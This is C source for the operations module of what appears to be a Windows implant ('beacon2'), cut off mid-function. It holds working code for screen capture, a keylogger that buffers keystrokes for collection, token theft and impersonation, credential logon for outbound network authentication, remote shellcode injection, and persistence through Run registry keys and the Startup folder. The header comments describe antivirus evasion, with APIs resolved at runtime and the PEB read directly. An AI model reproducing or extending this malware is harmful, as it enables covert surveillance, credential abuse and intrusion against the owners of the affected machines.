/*
 * csdev :: beacon2_ops.c  --  植入体原生能力 (截屏 / 键盘记录 / Token / 注入 / 端口扫描)
 * ==========================================================================
 * 免杀硬约束: 不得新增静态导入。
 *   本文件所有非 kernel32/advapi32 的 API (user32 / gdi32 / ws2_32) 全部通过
 *   LoadLibraryA + GetProcAddress 在运行期解析, 导入表中不出现这些 DLL。
 *
 * 用法: 由 beacon2.c 的 run_task 按 cmd_class 调用。
 * ==========================================================================
 */
#include <windows.h>

#include "../crypto/crypto.h"   /* csdev_random: ops_psexec 的随机服务名要用 */
#include "beacon2_ops.h"

/* GetProcAddress 返回值必须经函数指针间接赋值才能调用; 这是 Windows 上解析
 * 动态符号的标准做法, GCC 的 strict-aliasing 警告在此场景下是保守误报。 */
#if defined(__GNUC__)
#pragma GCC diagnostic ignored "-Wstrict-aliasing"
#endif

/* ------------------------------------------------------------ 动态解析 */

typedef struct {
    HMODULE hUser32;
    HMODULE hGdi32;
    HMODULE hWs2;

    /* user32 */
    HDC     (WINAPI *GetDC)(HWND);
    int     (WINAPI *ReleaseDC)(HWND, HDC);
    int     (WINAPI *GetSystemMetrics)(int);
    short   (WINAPI *GetAsyncKeyState)(int);
    BOOL    (WINAPI *GetKeyboardState)(PBYTE);
    int     (WINAPI *ToUnicodeEx)(UINT, UINT, const BYTE *, LPWSTR, int, UINT, HKL);
    HKL     (WINAPI *GetKeyboardLayout)(DWORD);

    /* gdi32 */
    HDC     (WINAPI *CreateCompatibleDC)(HDC);
    HBITMAP (WINAPI *CreateCompatibleBitmap)(HDC, int, int);
    HBITMAP (WINAPI *CreateDIBSection)(HDC, const void *, unsigned int, void **, HANDLE, DWORD);
    HGDIOBJ (WINAPI *SelectObject)(HDC, HGDIOBJ);
    BOOL    (WINAPI *BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
    BOOL    (WINAPI *DeleteDC)(HDC);
    BOOL    (WINAPI *DeleteObject)(HGDIOBJ);
    int     (WINAPI *GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);

    /* ws2_32 */
    int     (WINAPI *WSAStartup)(WORD, LPVOID);
    int     (WINAPI *WSACleanup)(void);
    unsigned int (WINAPI *inet_addr)(const char *);
    unsigned short (WINAPI *htons_)(unsigned short);
    int     (WINAPI *socket_)(int, int, int);
    int     (WINAPI *connect_)(unsigned int, const void *, int);
    int     (WINAPI *closesocket_)(unsigned int);
    int     (WINAPI *select_)(int, void *, void *, void *, const void *);
} OPS_DYN;

static OPS_DYN d;

typedef unsigned int   SOCKET_T;
typedef unsigned short USHORT_T;

/* ws2_32 需要的结构 (避免引入 winsock2.h 影响 windows.h 顺序) */
typedef struct { USHORT_T family; USHORT_T port; unsigned int addr[4]; char zero[8]; } SOCKADDR_IN_T;
typedef struct { unsigned int lo; int hi; } TIMEVAL_T;
typedef struct { unsigned int count; SOCKET_T socks[64]; } FD_SET_T;

static FARPROC sym(HMODULE m, const char *name)
{
    return m ? GetProcAddress(m, name) : NULL;
}

static void load_dyn(void)
{
    if (d.hUser32) return;

    d.hUser32 = LoadLibraryA("user32.dll");
    d.hGdi32  = LoadLibraryA("gdi32.dll");
    d.hWs2    = LoadLibraryA("ws2_32.dll");

    if (d.hUser32) {
        *(FARPROC *)&d.GetDC            = sym(d.hUser32, "GetDC");
        *(FARPROC *)&d.ReleaseDC        = sym(d.hUser32, "ReleaseDC");
        *(FARPROC *)&d.GetSystemMetrics = sym(d.hUser32, "GetSystemMetrics");
        *(FARPROC *)&d.GetAsyncKeyState = sym(d.hUser32, "GetAsyncKeyState");
        *(FARPROC *)&d.GetKeyboardState = sym(d.hUser32, "GetKeyboardState");
        *(FARPROC *)&d.ToUnicodeEx      = sym(d.hUser32, "ToUnicodeEx");
        *(FARPROC *)&d.GetKeyboardLayout= sym(d.hUser32, "GetKeyboardLayout");
    }
    if (d.hGdi32) {
        *(FARPROC *)&d.CreateCompatibleDC    = sym(d.hGdi32, "CreateCompatibleDC");
        *(FARPROC *)&d.CreateCompatibleBitmap= sym(d.hGdi32, "CreateCompatibleBitmap");
        *(FARPROC *)&d.CreateDIBSection      = sym(d.hGdi32, "CreateDIBSection");
        *(FARPROC *)&d.SelectObject          = sym(d.hGdi32, "SelectObject");
        *(FARPROC *)&d.BitBlt                = sym(d.hGdi32, "BitBlt");
        *(FARPROC *)&d.DeleteDC              = sym(d.hGdi32, "DeleteDC");
        *(FARPROC *)&d.DeleteObject          = sym(d.hGdi32, "DeleteObject");
        *(FARPROC *)&d.GetDIBits             = sym(d.hGdi32, "GetDIBits");
    }
    if (d.hWs2) {
        *(FARPROC *)&d.WSAStartup  = sym(d.hWs2, "WSAStartup");
        *(FARPROC *)&d.WSACleanup  = sym(d.hWs2, "WSACleanup");
        *(FARPROC *)&d.inet_addr   = sym(d.hWs2, "inet_addr");
        *(FARPROC *)&d.htons_      = sym(d.hWs2, "htons");
        *(FARPROC *)&d.socket_     = sym(d.hWs2, "socket");
        *(FARPROC *)&d.connect_    = sym(d.hWs2, "connect");
        *(FARPROC *)&d.closesocket_= sym(d.hWs2, "closesocket");
        *(FARPROC *)&d.select_     = sym(d.hWs2, "select");
    }
}

/* ---------------------------------------------------------------- 工具 */

static void ocpy(void *dst, const void *src, unsigned int n)
{
    unsigned char *a = (unsigned char *)dst;
    const unsigned char *b = (const unsigned char *)src;
    while (n--) *a++ = *b++;
}

static void oset(void *dst, int v, unsigned int n)
{
    unsigned char *a = (unsigned char *)dst;
    while (n--) *a++ = (unsigned char)v;
}

/* PEB 基址 (x64: GS:[0x60]); 用于免 API 读取自身路径 */
static unsigned long long gs_base_local(void)
{
    unsigned long long v;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(v));
    return v;
}

static unsigned int olen_local(const char *s)
{
    unsigned int n = 0;
    while (s[n]) n++;
    return n;
}

static unsigned int oappend(unsigned char *out, unsigned int cap, unsigned int at, const char *s)
{
    unsigned int i;
    for (i = 0; s[i] && at < cap; i++) out[at++] = (unsigned char)s[i];
    return at;
}

/* 全等比较 (子命令分发用) */
static int oeq(const char *a, const char *b)
{
    if (!a || !b) return 0;
    while (*a && *b) {
        if (*a != *b) return 0;
        a++; b++;
    }
    return *a == *b;
}

/* Copy src into dst with a hard bound, always NUL terminated. */
static void ocpy_n(char *dst, const char *src, unsigned int cap)
{
    unsigned int i = 0;
    if (!dst || src == 0 || cap == 0) return;
    while (src[i] && i + 1 < cap) { dst[i] = src[i]; i++; }
    dst[i] = 0;
}

/* Split a whitespace separated string in place. Writes up to n field
 * pointers into out and returns how many were found. Only spaces and tabs
 * are separators, so a password containing them is not supported (the same
 * limitation command line style tools have). */
static int osplit(char *s, char **out, int n)
{
    int k = 0;
    if (!s || !out || n <= 0) return 0;
    while (*s && k < n) {
        while (*s == ' ' || *s == '\t') s++;
        if (!*s) break;
        out[k++] = s;
        while (*s && *s != ' ' && *s != '\t') s++;
        if (*s) *s++ = 0;
    }
    return k;
}

/* Append an unsigned decimal number (used for Win32 error codes). */
static unsigned int oappend_dec(unsigned char *out, unsigned int cap,
                                unsigned int at, unsigned int v)
{
    char t[16];
    int n = 0;
    if (v == 0) t[n++] = '0';
    while (v) { t[n++] = (char)('0' + (v % 10)); v /= 10; }
    while (n > 0) {
        n--;
        if (at < cap) out[at++] = (unsigned char)t[n];
    }
    return at;
}

/* ------------------------------------------------------------- 截屏 */

/* 抓全屏生成 24 位 BMP。返回写入 out 的字节数, 0 表示失败。
 * 说明: 不引入 GDI+ / WIC 编码器 (会新增 DLL 依赖), 因此输出 BMP;
 *       体积较大时由上层分块回传。 */
unsigned int ops_screenshot(unsigned char *out, unsigned int cap)
{
    HDC hScreen = NULL, hMem = NULL;
    HBITMAP hBmp = NULL, hOld = NULL;
    BITMAPINFO bi;
    void *bits = NULL;
    unsigned int w, h, rowsize, imgsize, total = 0, r;
    int i;

    load_dyn();
    if (!d.GetDC || !d.CreateCompatibleDC || !d.CreateDIBSection || !d.BitBlt ||
        !d.GetSystemMetrics) {
        return 0;
    }

    w = (unsigned int)d.GetSystemMetrics(0);   /* SM_CXSCREEN */
    h = (unsigned int)d.GetSystemMetrics(1);   /* SM_CYSCREEN */
    if (w == 0 || h == 0 || w > 8192 || h > 8192) return 0;

    rowsize = ((w * 3 + 3) / 4) * 4;           /* 24 位行按 4 字节对齐 */
    imgsize = rowsize * h;
    if (54u + imgsize > cap) return 0;

    hScreen = d.GetDC(NULL);
    if (!hScreen) return 0;
    hMem = d.CreateCompatibleDC(hScreen);
    if (!hMem) { d.ReleaseDC(NULL, hScreen); return 0; }

    /* 用 CreateDIBSection 直接拿到像素指针 —— 避开 GetDIBits 要求
     * "位图不得选入 DC" 的限制 (该限制在部分环境下会导致进程崩溃)。 */
    oset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = (LONG)w;
    bi.bmiHeader.biHeight      = -(LONG)h;     /* 负高度 = 自顶向下 */
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 24;
    bi.bmiHeader.biCompression = 0;            /* BI_RGB */
    bi.bmiHeader.biSizeImage   = imgsize;

    hBmp = d.CreateDIBSection(hScreen, &bi, 0, &bits, NULL, 0);
    if (!hBmp || !bits) goto cleanup;

    hOld = (HBITMAP)d.SelectObject(hMem, hBmp);
    /* SRCCOPY | CAPTUREBLT: 连分层窗口一起抓 */
    if (!d.BitBlt(hMem, 0, 0, (int)w, (int)h, hScreen, 0, 0, 0x40CC0020)) goto cleanup;

    /* --- BMP 文件头 (14) + DIB 头 (40) --- */
    total = 54u + imgsize;
    oset(out, 0, 54);
    out[0] = 'B'; out[1] = 'M';
    out[2] = (unsigned char)(total);
    out[3] = (unsigned char)(total >> 8);
    out[4] = (unsigned char)(total >> 16);
    out[5] = (unsigned char)(total >> 24);
    out[10] = 54;
    out[14] = 40;
    for (i = 0; i < 4; i++) {
        out[18 + i] = (unsigned char)(w >> (8 * i));        /* width  */
        out[22 + i] = (unsigned char)(h >> (8 * i));        /* height */
        out[34 + i] = (unsigned char)(imgsize >> (8 * i));  /* 数据大小 */
    }
    out[26] = 1;
    out[28] = 24;

    /* 像素自顶向下 -> BMP 约定自底向上, 逐行翻转 */
    for (r = 0; r < h; r++) {
        ocpy(out + 54 + r * rowsize, (unsigned char *)bits + (h - 1 - r) * rowsize, rowsize);
    }

cleanup:
    if (hMem) {
        if (hOld) d.SelectObject(hMem, hOld);
        d.DeleteDC(hMem);
    }
    if (hBmp) d.DeleteObject(hBmp);
    d.ReleaseDC(NULL, hScreen);

    return total;
}

/* ---------------------------------------------------------- 键盘记录 */

#define KEYBUF_SIZE (256u * 1024u)

static unsigned char *g_keybuf;
static unsigned int   g_keylen;
static int            g_keyrun;
static HANDLE         g_keythread;
static unsigned char  g_keyprev[256];

static const char g_lower[] =
    " 1234567890-=  qwertyuiop[]  asdfghjkl;'`  \\zxcvbnm,./";
static const char g_upper[] =
    " !@#$%^&*()_+  QWERTYUIOP{}  ASDFGHJKL:\"~  |ZXCVBNM<>?";

static void key_add_char(char c)
{
    if (!g_keybuf) return;
    if (g_keylen >= KEYBUF_SIZE - 1) return;
    g_keybuf[g_keylen++] = (unsigned char)c;
}

static void key_add_str(const char *s)
{
    while (*s) key_add_char(*s++);
}

static DWORD WINAPI key_thread(LPVOID param)
{
    int vk;
    (void)param;

    while (g_keyrun) {
        for (vk = 8; vk < 256; vk++) {
            short st;
            unsigned char ch = 0;

            if (vk == 160 || vk == 161 || vk == 162 || vk == 163) continue; /* Shift/Ctrl 修饰键 */
            st = d.GetAsyncKeyState ? d.GetAsyncKeyState(vk) : 0;
            if (st == 0) continue;
            if (!(st & 0x8000)) { g_keyprev[vk] = 0; continue; }
            if (g_keyprev[vk]) continue;             /* 已经按着, 不重复 */
            g_keyprev[vk] = 1;

            if (vk == 8)  { key_add_str("[BS]");  continue; }
            if (vk == 9)  { key_add_str("[TAB]"); continue; }
            if (vk == 13) { key_add_str("[CR]");  continue; }
            if (vk == 27) { key_add_str("[ESC]"); continue; }
            if (vk == 32) { key_add_char(' ');    continue; }

            /* 用 ToUnicodeEx 取字符 (含 Shift/CapsLock 状态) */
            if (d.ToUnicodeEx && d.GetKeyboardState && d.GetKeyboardLayout) {
                unsigned char ks[256];
                WCHAR wbuf[8];
                int n;
                oset(ks, 0, sizeof(ks));
                d.GetKeyboardState(ks);
                n = d.ToUnicodeEx((UINT)vk, 0, ks, wbuf, 8, 0, d.GetKeyboardLayout(0));
                if (n == 1 && wbuf[0] >= 32 && wbuf[0] < 127) {
                    key_add_char((char)wbuf[0]);
                    continue;
                }
            }

            /* 退化: 静态表 */
            if (vk >= 0x30 && vk <= 0x5A && vk < 256) {
                unsigned int idx = (unsigned int)(vk - 0x20);
                char c = 0;
                int shifted = (d.GetAsyncKeyState && (d.GetAsyncKeyState(16) & 0x8000)) ? 1 : 0;
                if (idx < sizeof(g_lower) - 1) {
                    c = shifted ? g_upper[idx] : g_lower[idx];
                }
                if (c) ch = (unsigned char)c;
            }
            if (ch) key_add_char((char)ch);
        }
        Sleep(25);
    }
    return 0;
}

/* start != 0 启动, 0 停止并返回已捕获内容 */
unsigned int ops_keylog(int start, unsigned char *out, unsigned int cap)
{
    load_dyn();

    if (start) {
        if (g_keyrun) return 0;
        if (!g_keybuf) {
            g_keybuf = (unsigned char *)VirtualAlloc(NULL, KEYBUF_SIZE,
                                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!g_keybuf) return 0;
        }
        g_keylen = 0;
        oset(g_keyprev, 0, sizeof(g_keyprev));
        g_keyrun = 1;
        g_keythread = CreateThread(NULL, 0, key_thread, NULL, 0, NULL);
        if (!g_keythread) { g_keyrun = 0; return 0; }
        {
            const char *m = "[+] 键盘记录已启动\r\n";
            return (unsigned int)oappend(out, cap, 0, m);
        }
    }

    g_keyrun = 0;
    if (g_keythread) {
        WaitForSingleObject(g_keythread, 2000);
        CloseHandle(g_keythread);
        g_keythread = NULL;
    }
    if (!g_keybuf || g_keylen == 0) {
        return (unsigned int)oappend(out, cap, 0, "[*] 键盘记录已停止, 无捕获\r\n");
    }
    {
        unsigned int n = g_keylen < cap ? g_keylen : cap;
        ocpy(out, g_keybuf, n);
        g_keylen = 0;
        return n;
    }
}

/* 供 beacon 主循环周期性取走缓冲 (不清空, 由上层决定) */
unsigned int ops_keylog_peek(unsigned char **buf)
{
    if (!g_keybuf || g_keylen == 0) { *buf = NULL; return 0; }
    *buf = g_keybuf;
    return g_keylen;
}

/* 取走并清空缓冲。out == NULL 表示仅丢弃 (标记已发送)。 */
unsigned int ops_keylog_drain(unsigned char *out, unsigned int cap)
{
    unsigned int n = g_keylen;
    if (!g_keybuf || n == 0) return 0;
    if (out) {
        if (n > cap) n = cap;
        ocpy(out, g_keybuf, n);
    } else {
        n = 0;
    }
    g_keylen = 0;
    return n;
}

int ops_keylog_active(void)
{
    return g_keyrun ? 1 : 0;
}

/* ---------------------------------------------------------------- Token */

unsigned int ops_token(const char *sub, const char *arg, unsigned char *out, unsigned int cap)
{
    unsigned int at = 0;

    if (!sub) return 0;

    if (oeq(sub, "getuid")) {
        char user[128];
        DWORD ul = 127;
        user[0] = 0;
        GetUserNameA(user, &ul);
        at = oappend(out, cap, 0, "[+] 当前身份: ");
        at = oappend(out, cap, at, user);
        at = oappend(out, cap, at, "\r\n");
        return at;
    }

    if (oeq(sub, "rev2self")) {
        RevertToSelf();
        return (unsigned int)oappend(out, cap, 0, "[+] 已还原为进程令牌\r\n");
    }

    if (oeq(sub, "steal")) {
        HANDLE hProc = NULL, hTok = NULL, hDup = NULL;
        DWORD pid = 0;
        unsigned int i = 0;
        while (arg && arg[i] >= '0' && arg[i] <= '9') { pid = pid * 10u + (unsigned int)(arg[i] - '0'); i++; }
        if (pid == 0) return (unsigned int)oappend(out, cap, 0, "[-] 用法: token steal <pid>\r\n");

        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProc) return (unsigned int)oappend(out, cap, 0, "[-] 无法打开进程 (需要管理员)\r\n");
        if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
            CloseHandle(hProc);
            return (unsigned int)oappend(out, cap, 0, "[-] OpenProcessToken 失败\r\n");
        }
        if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                             TokenImpersonation, &hDup)) {
            CloseHandle(hTok); CloseHandle(hProc);
            return (unsigned int)oappend(out, cap, 0, "[-] DuplicateTokenEx 失败\r\n");
        }
        if (!ImpersonateLoggedOnUser(hDup)) {
            CloseHandle(hDup); CloseHandle(hTok); CloseHandle(hProc);
            return (unsigned int)oappend(out, cap, 0, "[-] ImpersonateLoggedOnUser 失败\r\n");
        }
        CloseHandle(hDup); CloseHandle(hTok); CloseHandle(hProc);

        {
            char user[128];
            DWORD ul = 127;
            user[0] = 0;
            GetUserNameA(user, &ul);
            at = oappend(out, cap, 0, "[+] 已窃取令牌, 当前身份: ");
            at = oappend(out, cap, at, user);
            at = oappend(out, cap, at, "\r\n");
        }
        return at;
    }

    if (oeq(sub, "getprivs")) {
        HANDLE hTok = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
            return (unsigned int)oappend(out, cap, 0, "[-] OpenProcessToken 失败\r\n");
        }
        {
            DWORD need = 0;
            unsigned char *buf;
            at = oappend(out, cap, 0, "[+] 令牌特权:\r\n");
            GetTokenInformation(hTok, TokenPrivileges, NULL, 0, &need);
            if (need > 0 && need < 65536) {
                buf = (unsigned char *)VirtualAlloc(NULL, need, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (buf && GetTokenInformation(hTok, TokenPrivileges, buf, need, &need)) {
                    TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)buf;
                    DWORD k;
                    for (k = 0; k < tp->PrivilegeCount && at < cap - 80; k++) {
                        char name[128];
                        DWORD nl = sizeof(name);
                        name[0] = 0;
                        if (LookupPrivilegeNameA(NULL, &tp->Privileges[k].Luid, name, &nl)) {
                            at = oappend(out, cap, at, "    ");
                            at = oappend(out, cap, at, name);
                            at = oappend(out, cap, at, "\r\n");
                        }
                    }
                }
                if (buf) VirtualFree(buf, 0, MEM_RELEASE);
            }
        }
        CloseHandle(hTok);
        return at;
    }

    if (oeq(sub, "make")) {
        /*
         * token make <domain> <user> <password>
         *
         * LogonUserA with LOGON32_LOGON_NEW_CREDENTIALS creates a logon
         * session that carries the supplied credentials without replacing the
         * process token. That is exactly what "use these credentials against
         * the next network hop" needs: the impersonation applies to outbound
         * authentication (SMB/WMI/WinRM) while the local process keeps its own
         * rights. LOGON32_PROVIDER_DEFAULT lets Windows pick.
         *
         * LogonUserA / DuplicateToken / ImpersonateLoggedOnUser all live in
         * advapi32, which is one of the four DLLs the beacon may import
         * statically, so no dynamic resolution is needed here.
         */
        char buf[512];
        char dom[128], usr[160], pw[256];
        char *f[3];
        unsigned int k = 0, j = 0;
        int nf;
        HANDLE hTok = NULL, hDup = NULL;
        DWORD err;

        while (arg && arg[j] && k < sizeof(buf) - 1) buf[k++] = arg[j++];
        buf[k] = 0;

        nf = osplit(buf, f, 3);
        if (nf < 3) {
            return (unsigned int)oappend(out, cap, 0,
                "[-] usage: token make <domain> <user> <password>\r\n");
        }
        ocpy_n(dom, f[0], sizeof(dom));
        ocpy_n(usr, f[1], sizeof(usr));
        ocpy_n(pw,  f[2], sizeof(pw));

        if (!LogonUserA(usr, dom, pw, LOGON32_LOGON_NEW_CREDENTIALS,
                        LOGON32_PROVIDER_DEFAULT, &hTok)) {
            err = GetLastError();
            at = oappend(out, cap, 0, "[-] LogonUserA failed (error ");
            at = oappend_dec(out, cap, at, (unsigned int)err);
            at = oappend(out, cap, at, "): ");
            switch (err) {
            case ERROR_LOGON_FAILURE:
                at = oappend(out, cap, at, "logon failure");
                break;
            case ERROR_ACCOUNT_DISABLED:
                at = oappend(out, cap, at, "account disabled");
                break;
            case ERROR_ACCOUNT_RESTRICTION:
                at = oappend(out, cap, at, "account restriction");
                break;
            case ERROR_ACCOUNT_EXPIRED:
                at = oappend(out, cap, at, "account expired");
                break;
            case ERROR_PASSWORD_EXPIRED:
                at = oappend(out, cap, at, "password expired");
                break;
            case ERROR_PASSWORD_MUST_CHANGE:
                at = oappend(out, cap, at, "password must change at next logon");
                break;
            case ERROR_ACCOUNT_LOCKED_OUT:
                at = oappend(out, cap, at, "account locked out");
                break;
            case ERROR_LOGON_TYPE_NOT_GRANTED:
                at = oappend(out, cap, at, "logon type not granted");
                break;
            default:
                at = oappend(out, cap, at, "see Win32 error code");
                break;
            }
            at = oappend(out, cap, at,
                "\r\n[*] LOGON32_LOGON_NEW_CREDENTIALS does not validate the password"
                " locally, so a wrong password normally does NOT surface here.\r\n");
            return at;
        }

        if (!DuplicateToken(hTok, SecurityImpersonation, &hDup)) {
            err = GetLastError();
            CloseHandle(hTok);
            at = oappend(out, cap, 0, "[-] DuplicateToken failed (error ");
            at = oappend_dec(out, cap, at, (unsigned int)err);
            at = oappend(out, cap, at, ")\r\n");
            return at;
        }

        if (!ImpersonateLoggedOnUser(hDup)) {
            err = GetLastError();
            CloseHandle(hDup);
            CloseHandle(hTok);
            at = oappend(out, cap, 0, "[-] ImpersonateLoggedOnUser failed (error ");
            at = oappend_dec(out, cap, at, (unsigned int)err);
            at = oappend(out, cap, at, ")\r\n");
            return at;
        }

        CloseHandle(hDup);
        CloseHandle(hTok);

        {
            char who[128];
            DWORD ul = 127;
            who[0] = 0;
            GetUserNameA(who, &ul);
            at = oappend(out, cap, 0, "[+] token make: new credentials for ");
            at = oappend(out, cap, at, dom);
            at = oappend(out, cap, at, "\\");
            at = oappend(out, cap, at, usr);
            at = oappend(out, cap, at,
                " installed in the logon session\r\n");
            at = oappend(out, cap, at,
                "[*] local identity is still ");
            at = oappend(out, cap, at, who);
            at = oappend(out, cap, at,
                " -- this is expected: LOGON32_LOGON_NEW_CREDENTIALS"
                " (same as 'runas /netonly')\r\n");
            at = oappend(out, cap, at,
                "    only changes the credentials used for OUTBOUND network"
                " authentication (SMB / WMI / WinRM),\r\n");
            at = oappend(out, cap, at,
                "    and it does not verify the password locally.\r\n");
            at = oappend(out, cap, at,
                "[+] use 'token rev2self' to drop it\r\n");
        }
        return at;
    }

    return (unsigned int)oappend(out, cap, 0,
        "[-] unknown token subcommand; supported: getuid | steal <pid> | rev2self | "
        "getprivs | make <domain> <user> <password>\r\n");
}

/* ---------------------------------------------------------------- 注入 */

/* 把 payload 写入目标进程并创建远程线程执行 */
unsigned int ops_inject(unsigned int pid, const unsigned char *payload, unsigned int plen,
                        unsigned char *out, unsigned int cap)
{
    HANDLE hProc;
    LPVOID remote;
    SIZE_T written = 0;
    HANDLE hThread;
    DWORD tid = 0;

    if (pid == 0 || !payload || plen == 0) {
        return (unsigned int)oappend(out, cap, 0, "[-] 用法: inject <pid> <base64 shellcode>\r\n");
    }

    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                        PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, (DWORD)pid);
    if (!hProc) {
        return (unsigned int)oappend(out, cap, 0, "[-] 无法打开目标进程 (需要管理员/同架构)\r\n");
    }

    remote = VirtualAllocEx(hProc, NULL, plen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        CloseHandle(hProc);
        return (unsigned int)oappend(out, cap, 0, "[-] 远程内存分配失败\r\n");
    }

    if (!WriteProcessMemory(hProc, remote, payload, plen, &written)) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return (unsigned int)oappend(out, cap, 0, "[-] 远程写入失败\r\n");
    }

    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote,
                                 NULL, 0, &tid);
    if (!hThread) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return (unsigned int)oappend(out, cap, 0, "[-] 远程线程创建失败\r\n");
    }

    CloseHandle(hThread);
    CloseHandle(hProc);

    {
        char line[128];
        unsigned int at;
        char t[16];
        int n = 0, k;
        unsigned int v = tid;
        char tmp[16];
        if (v == 0) tmp[n++] = '0';
        while (v) { tmp[n++] = (char)('0' + (v % 10)); v /= 10; }
        for (k = 0; k < n; k++) t[k] = tmp[n - 1 - k];
        t[n] = 0;
        oset(line, 0, sizeof(line));
        at = oappend((unsigned char *)line, sizeof(line) - 1, 0, "[+] 已注入 pid=");
        {
            char pt[16];
            int m = 0, q;
            unsigned int w2 = pid;
            if (w2 == 0) pt[m++] = '0';
            while (w2) { pt[m++] = (char)('0' + (w2 % 10)); w2 /= 10; }
            for (q = m - 1; q >= 0; q--) line[at++] = (unsigned char)pt[q];
        }
        at = oappend((unsigned char *)line, sizeof(line) - 1, at, " tid=");
        at = oappend((unsigned char *)line, sizeof(line) - 1, at, t);
        at = oappend((unsigned char *)line, sizeof(line) - 1, at, "\r\n");
        return (unsigned int)oappend(out, cap, 0, (const char *)line);
    }
}

/* ---------------------------------------------------------------- 持久化 */

/* 从 PEB 取自身完整路径 (不调用 GetModuleFileNameA, 避免自读取行为链) */
static int peb_full_path(char *out, unsigned int cap)
{
    unsigned long long base;
    unsigned char *peb, *pp;
    unsigned short len, *buf;
    unsigned int i, n = 0;

    if (cap < 8) return 0;
    out[0] = 0;

    base = (unsigned long long)gs_base_local();
    if (!base) return 0;
    peb = (unsigned char *)base;
    pp = *(unsigned char **)(peb + 0x20);
    if (!pp) return 0;

    len = *(unsigned short *)(pp + 0x60);
    buf = *(unsigned short **)(pp + 0x68);
    if (!buf || len == 0 || len > 1024) return 0;

    len /= 2;
    for (i = 0; i < len && n < cap - 1; i++) {
        unsigned int w = buf[i];
        out[n++] = (w < 128 && w != 0) ? (char)w : '?';
    }
    out[n] = 0;
    return n > 0;
}

unsigned int ops_persist(int mode, const char *name, unsigned char *out, unsigned int cap)
{
    char self[600];
    unsigned int at = 0;
    const char *val = (name && name[0]) ? name : "WindowsHelper";

    if (!peb_full_path(self, sizeof(self))) {
        return (unsigned int)oappend(out, cap, 0, "[-] 无法获取当前模块路径\r\n");
    }

    switch (mode) {

    /* ---- 1/2: 注册表 Run 键 (用户级 / 机器级) ---- */
    case 1:
    case 2:
        {
            HKEY root = (mode == 1) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
            const char *sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            HKEY hKey = NULL;
            DWORD disp = 0;

            if (RegCreateKeyExA(root, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, &disp) != 0) {
                return (unsigned int)oappend(out, cap, 0,
                    "[-] 打开 Run 键失败 (机器级需要管理员)\r\n");
            }
            if (RegSetValueExA(hKey, val, 0, REG_SZ, (const BYTE *)self,
                               (DWORD)olen_local(self) + 1) != 0) {
                RegCloseKey(hKey);
                return (unsigned int)oappend(out, cap, 0, "[-] 写入注册表失败\r\n");
            }
            RegCloseKey(hKey);

            at = oappend(out, cap, 0, "[+] 已写入 ");
            at = oappend(out, cap, at, (mode == 1) ? "HKCU" : "HKLM");
            at = oappend(out, cap, at, "\\...\\Run\\");
            at = oappend(out, cap, at, val);
            at = oappend(out, cap, at, "\r\n[+] 目标: ");
            at = oappend(out, cap, at, self);
            at = oappend(out, cap, at, "\r\n");
            return at;
        }

    /* ---- 3: 启动目录 (复制自身) ---- */
    case 3:
        {
            char dir[520];
            char dst[600];
            DWORD n = GetEnvironmentVariableA("APPDATA", dir, sizeof(dir));
            unsigned int k, m = 0;

            if (n == 0 || n >= sizeof(dir)) {
                return (unsigned int)oappend(out, cap, 0, "[-] 无法定位 APPDATA\r\n");
            }
            for (k = 0; dir[k] && m < sizeof(dst) - 64; k++) dst[m++] = dir[k];
            {
                const char *tail = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
                unsigned int t;
                for (t = 0; tail[t] && m < sizeof(dst) - 40; t++) dst[m++] = tail[t];
            }
            for (k = 0; val[k] && m < sizeof(dst) - 8; k++) dst[m++] = val[k];
            dst[m++] = '.'; dst[m++] = 'e'; dst[m++] = 'x'; dst[m++] = 'e'; dst[m] = 0;

            if (!CopyFileA(self, dst, FALSE)) {
                return (unsigned int)oappend(out, cap, 0, "[-] 复制到启动目录失败\r\n");
            }
            at = oappend(out, cap, 0, "[+] 已投放启动项: ");
            at = oappend(out, cap, at, dst);
            at = oappend(out, cap, at, "\r\n");
            return at;
        }

    /* ---- 7: 列出当前持久化痕迹 ---- */
    case 7:
        {
            HKEY hKey = NULL;
            DWORD idx = 0;
            char vname[260];
            unsigned char vdata[600];
            DWORD vnlen, vdlen, vtype;

            {
                const char *hdr = "[*] HKCU Run / HKLM Run / 启动目录\r\n";
                at = oappend(out, cap, 0, hdr);
            }
            {
                HKEY roots[2];
                const char *labels[2];
                int ri;
                roots[0] = HKEY_CURRENT_USER;
                roots[1] = HKEY_LOCAL_MACHINE;
                labels[0] = "HKCU";
                labels[1] = "HKLM";

                for (ri = 0; ri < 2; ri++) {
                    if (RegOpenKeyExA(roots[ri],
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, KEY_READ, &hKey) != 0) {
                        continue;
                    }
                    idx = 0;
                    for (;;) {
                        vnlen = sizeof(vname) - 1;
                        vdlen = sizeof(vdata) - 1;
                        vtype = 0;
                        if (RegEnumValueA(hKey, idx, vname, &vnlen, NULL, &vtype,
                                          vdata, &vdlen) != 0) {
                            break;
                        }
                        vdata[vdlen] = 0;
